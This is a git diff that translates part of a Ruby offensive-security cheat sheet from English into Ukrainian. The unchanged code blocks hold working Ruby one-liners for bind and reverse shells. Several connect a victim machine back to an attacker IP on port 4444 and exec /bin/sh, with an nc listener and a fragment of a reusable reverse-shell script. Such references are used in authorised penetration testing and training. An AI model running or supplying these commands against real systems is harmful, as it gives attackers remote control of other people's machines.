@@ -4,32 +4,33 @@
 
 **Зверніть увагу** для комп'ютерів з Windows заміняйте "/bin/sh" на "cmd.exe"
 
-## Connect to Bind shell
-from terminal
+## Підключення до прив'яханого(Bind) шелу
+з Терміналу
 ```ruby
 ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'
 ```
-since `192.168.0.15` is the victim IP
+де `192.168.0.15` - IP адреса атакованої машини.
 
-## Reverse shell
-Attacker is listening on port 4444 `nc -lvp 4444`. Now on victim machine run
+## Зворотній, реверсивний шел
+Атакуючий слухає на порту 4444 `nc -lvp 4444`. Тепер на атакованій машині виконайте наступне:
 ```ruby
 ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
 ```
 
-if you don't want to rely on `/bin/sh`
+Якщо ви не бажаєте покладатися на `/bin/sh`:
+
 ```ruby
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
-if you don't want to rely on `cmd.exe`
+Якщо ви не бажаєте покладатися на `cmd.exe`
 ```ruby
 ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
-since `192.168.0.13` is the attacker IP
+де `192.168.0.13` - IP адреса атакуючої машини.
 
-If you want it more flexible script file
+І якщо вам потрібен більш  гнучкий скрипт:
 
 ```ruby
 #!/usr/bin/env ruby
@@ -44,8 +45,8 @@ s = TCPSocket.open(ip,port).to_i
 exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
 
-## Bind and Reverse shell 
-This is an awesome implementation for a standalone  [bind][1] and [reverse][2] shells scripts written by [Hood3dRob1n][3] on GitHub . The bind shell requires authentication while reverse is not.
+## Прив'язаний(bind) та зворотній(reverse) шели 
+Ось чудова реалізація скрипту для прив'язки[bind][1] та створення реверсивного[reverse][2] шелу написаниго [Hood3dRob1n][3]. Bind шел потрубеє аутентифікації в той час як реверсійний - ні.
 
 
 
